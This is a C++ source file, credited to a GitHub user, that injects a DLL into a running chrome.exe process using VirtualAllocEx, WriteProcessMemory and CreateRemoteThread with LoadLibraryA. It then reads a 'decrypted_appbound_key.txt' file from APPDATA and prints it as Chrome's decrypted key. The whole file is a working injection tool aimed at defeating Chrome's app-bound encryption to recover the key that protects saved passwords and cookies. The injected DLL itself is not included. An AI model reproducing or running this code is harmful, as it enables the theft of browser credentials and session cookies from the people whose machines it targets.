#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <string>
#include <tchar.h>
// created by https://github.com/SilentDev33 
void appdata() {
    wchar_t appDataPath[MAX_PATH];
    DWORD len = GetEnvironmentVariableW(L"APPDATA", appDataPath, MAX_PATH);
    if (len > 0 && len < MAX_PATH) {
       
        wchar_t fullPath[MAX_PATH];
        wsprintfW(fullPath, L"%s\\decrypted_appbound_key.txt", appDataPath);

        
        char ansiPath[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, fullPath, -1, ansiPath, MAX_PATH, NULL, NULL);

        std::ifstream infile(ansiPath);
        if (infile.is_open()) {
            std::string key;
            std::getline(infile, key);
            infile.close();

            std::cout << "[+] Chrome decrypted key: " << key << std::endl;
        }
        else {
            std::cerr << "[-] Failed to open file: " << ansiPath << std::endl;
        }
    }
    else {
        std::cerr << "[-] Failed to retrieve APPDATA environment variable." << std::endl;
    }
}

int main() {
    std::cout << "Created by: https://github.com/SilentDev33\n";
    LPCWSTR processName = L"chrome.exe";
    LPCSTR dllPath = "C:\\Users\\jonny\\Desktop\\app_bound\\x64\\Debug\\app_bound.dll"; //full path to dll

    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create process snapshot.\n";
        return -1;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                std::wcout << L"[+]Process found: " << processName << L" (PID: " << pid << L")\n";
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);

    if (pid == 0) {
        std::cout << "Process not found.\n";
        return -1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "Failed to open process.\n";
        return -1;
    }

    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cout << "Failed to allocate memory in the process.\n";
        CloseHandle(hProcess);
        return -1;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cout << "Failed to write DLL path to process.\n";
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibrary) {
        std::cout << "Failed to get address of LoadLibraryA.\n";
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
    if (!hThread) {
        DWORD error = GetLastError();
        std::cout << "Failed to create remote thread. Error: " << error << "\n";
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    std::wcout << L"[+] Injected into process: " << processName << L" (PID: " << pid << L")\n";

    WaitForSingleObject(hThread, INFINITE);
    appdata();
 //   std::cout << "\nPress Enter to exit...";
  //  std::cin.get();
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
